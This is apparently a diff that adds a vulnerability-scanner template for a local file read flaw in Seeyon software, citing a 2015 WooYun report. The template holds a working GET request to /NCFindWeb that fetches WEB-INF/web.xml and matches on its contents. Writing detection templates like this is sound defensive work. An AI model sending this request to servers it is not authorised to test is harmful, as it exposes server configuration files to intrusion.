@@ -1,0 +1,16 @@
+id: seeyon-wooyun-2015-148227
+
+info:
+  name: Seeyon WooYun LFR
+  author: princechaddha
+  severity: high
+  reference: 
+    - https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+        expression: response.status == 200 && response.content_type == "application/xml" && response.body.bcontains(bytes("<servlet-name>NCInvokerServlet</servlet-name>"))
+expression: r0()
